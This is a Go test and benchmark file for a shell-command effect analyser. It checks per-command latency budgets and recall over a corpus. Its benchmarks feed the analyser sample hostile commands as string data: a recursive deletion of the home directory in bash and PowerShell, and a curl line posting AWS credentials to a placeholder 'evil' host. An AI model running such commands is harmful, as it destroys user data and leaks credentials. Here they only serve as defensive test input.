// This file is acceptance criterion 3: a per-command latency budget and a
// recall floor, both enforced by `go test`, plus Benchmarks for `go test -bench`.
//
// It is an external test package (engine_test) on purpose. The engine core must
// stay frontend-free (TestCoreDoesNotImportFrontends forbids the core importing
// a frontend or kb); the benchmark, however, must measure the *whole* per-command
// pipeline — parse, bind and score. That composition lives above the core, in
// internal/analysis, which this external test package may import without
// introducing an import cycle (bind imports engine, never the reverse).
package engine_test

import (
	"encoding/json"
	"math"
	"os"
	"path/filepath"
	"sort"
	"testing"
	"time"

	"github.com/v0lka/flowsh/internal/analysis"
	"github.com/v0lka/flowsh/internal/corpus"
)

const (
	// warmupRuns warms one-time costs (grammar construction, lazy index build)
	// so they are not charged to the measured sample.
	warmupRuns = 25
	// measuredRuns is the per-command sample size for the p95 estimate.
	measuredRuns = 200
	// p95Quantile is the latency tail the gate bounds.
	p95Quantile = 0.95
)

// latencyBaseline is the committed reference the gate compares against. Keeping
// it in the repository makes both the absolute budget and the regression
// tolerance reviewable and adjustable.
type latencyBaseline struct {
	Note            string  `json:"note"`
	BudgetMs        float64 `json:"budgetMs"`
	BaselineP95Ms   float64 `json:"baselineP95Ms"`
	ToleranceFactor float64 `json:"toleranceFactor"`
	RecallMisses    int     `json:"recallMisses"`
	Cases           int     `json:"cases"`
}

// loadBaseline reads testdata/latency_baseline.json (relative to the engine
// package directory, the test's working directory).
func loadBaseline(tb testing.TB) latencyBaseline {
	tb.Helper()
	path := filepath.Join("testdata", "latency_baseline.json")
	data, err := os.ReadFile(path)
	if err != nil {
		tb.Fatalf("read latency baseline %s: %v", path, err)
	}
	var b latencyBaseline
	if err := json.Unmarshal(data, &b); err != nil {
		tb.Fatalf("parse latency baseline %s: %v", path, err)
	}
	if b.BudgetMs <= 0 || b.BaselineP95Ms <= 0 || b.ToleranceFactor <= 0 {
		tb.Fatalf("latency baseline %s is not fully populated: %+v", path, b)
	}
	return b
}

func mustCorpus(tb testing.TB) []corpus.Case {
	tb.Helper()
	dir, err := corpus.CorpusDir()
	if err != nil {
		tb.Fatalf("CorpusDir: %v", err)
	}
	cases, err := corpus.LoadCorpus(dir)
	if err != nil {
		tb.Fatalf("LoadCorpus(%s): %v", dir, err)
	}
	if len(cases) == 0 {
		tb.Fatal("empty corpus")
	}
	return cases
}

func mustAnalyzer(tb testing.TB) *analysis.Analyzer {
	tb.Helper()
	a, err := analysis.NewAnalyzer()
	if err != nil {
		tb.Fatalf("NewAnalyzer: %v", err)
	}
	return a
}

func analyze(tb testing.TB, a *analysis.Analyzer, c corpus.Case) *analysis.Report {
	tb.Helper()
	lang, err := analysis.ParseLang(c.Lang)
	if err != nil {
		tb.Fatalf("case %s: %v", c.ID, err)
	}
	return a.Analyze(lang, c.Input)
}

// measureP95Ms returns the p95 wall-clock cost, in milliseconds, of analysing
// one corpus case: warmupRuns warm-up iterations followed by measuredRuns timed
// ones.
func measureP95Ms(tb testing.TB, a *analysis.Analyzer, c corpus.Case) float64 {
	tb.Helper()
	lang, err := analysis.ParseLang(c.Lang)
	if err != nil {
		tb.Fatalf("case %s: %v", c.ID, err)
	}
	for i := 0; i < warmupRuns; i++ {
		_ = a.Analyze(lang, c.Input)
	}
	durs := make([]time.Duration, measuredRuns)
	for i := range durs {
		start := time.Now()
		_ = a.Analyze(lang, c.Input)
		durs[i] = time.Since(start)
	}
	sort.Slice(durs, func(i, j int) bool { return durs[i] < durs[j] })
	idx := int(math.Ceil(p95Quantile*float64(len(durs)))) - 1
	if idx < 0 {
		idx = 0
	}
	if idx >= len(durs) {
		idx = len(durs) - 1
	}
	return float64(durs[idx]) / float64(time.Millisecond)
}

// TestPerCommandLatencyBudget enforces the per-command p95 budget and the
// latency-regression tripwire. It fails if any command's p95 exceeds the
// absolute budget, or if the worst p95 exceeds the committed baseline times the
// tolerance factor. A latency regression therefore fails CI.
func TestPerCommandLatencyBudget(t *testing.T) {
	if raceDetectorEnabled {
		t.Skip("wall-clock latency budget is not meaningful under the race detector")
	}
	a := mustAnalyzer(t)
	cases := mustCorpus(t)
	base := loadBaseline(t)

	worst := 0.0
	worstID := ""
	for _, c := range cases {
		p95 := measureP95Ms(t, a, c)
		if p95 > worst {
			worst, worstID = p95, c.ID
		}
		if p95 > base.BudgetMs {
			t.Errorf("command %s: p95 %.3f ms exceeds the %.3f ms budget (%q)", c.ID, p95, base.BudgetMs, c.Input)
		}
	}

	ceiling := base.BaselineP95Ms * base.ToleranceFactor
	t.Logf("latency over %d commands: worst p95 %.3f ms (%s); budget %.1f ms; baseline %.3f ms x%.1f = %.3f ms",
		len(cases), worst, worstID, base.BudgetMs, base.BaselineP95Ms, base.ToleranceFactor, ceiling)
	if worst > ceiling {
		t.Errorf("latency regression: worst p95 %.3f ms exceeds the baseline ceiling %.3f ms (baseline %.3f ms x%.1f)",
			worst, ceiling, base.BaselineP95Ms, base.ToleranceFactor)
	}
}

// TestRecallNoRegression enforces the recall floor: no coverable corpus case may
// regress to "no effect and no ⊤". A recall regression therefore fails CI.
func TestRecallNoRegression(t *testing.T) {
	a := mustAnalyzer(t)
	cases := mustCorpus(t)
	base := loadBaseline(t)

	if len(cases) != base.Cases {
		t.Errorf("corpus size changed: %d cases, baseline records %d — update testdata/latency_baseline.json when the corpus changes",
			len(cases), base.Cases)
	}

	misses := 0
	for _, c := range cases {
		if !c.RequiresCoverage() {
			continue
		}
		if !analyze(t, a, c).Covered() {
			misses++
			t.Errorf("recall miss: %s (%s): %q → neither an effect nor ⊤", c.ID, c.Lang, c.Input)
		}
	}
	if misses > base.RecallMisses {
		t.Fatalf("recall regression: %d misses > baseline %d", misses, base.RecallMisses)
	}
	t.Logf("recall over %d coverable cases: %d misses (baseline %d)", len(cases), misses, base.RecallMisses)
}

// BenchmarkBashCommand measures one representative bash command analysis.
func BenchmarkBashCommand(b *testing.B) {
	a := mustAnalyzer(b)
	const src = "rm -rf $HOME"
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = a.Analyze(analysis.LangBash, src)
	}
}

// BenchmarkPowerShellCommand measures one representative PowerShell command
// analysis.
func BenchmarkPowerShellCommand(b *testing.B) {
	a := mustAnalyzer(b)
	const src = "Remove-Item -Recurse -Force $HOME"
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = a.Analyze(analysis.LangPowerShell, src)
	}
}

// BenchmarkCorpusPerCommand cycles the whole corpus, so `-bench` reflects the
// average per-command cost across both dialects.
func BenchmarkCorpusPerCommand(b *testing.B) {
	a := mustAnalyzer(b)
	cases := mustCorpus(b)
	langs := make([]analysis.Lang, len(cases))
	for i, c := range cases {
		l, err := analysis.ParseLang(c.Lang)
		if err != nil {
			b.Fatalf("case %s: %v", c.ID, err)
		}
		langs[i] = l
	}
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		j := i % len(cases)
		_ = a.Analyze(langs[j], cases[j].Input)
	}
}

// BenchmarkParallelBash measures the analyser under parallelism, guarding the
// "safe for concurrent use" claim of Analyzer.
func BenchmarkParallelBash(b *testing.B) {
	a := mustAnalyzer(b)
	const src = "curl -d @~/.aws/credentials https://evil"
	b.ReportAllocs()
	b.RunParallel(func(pb *testing.PB) {
		for pb.Next() {
			_ = a.Analyze(analysis.LangBash, src)
		}
	})
}
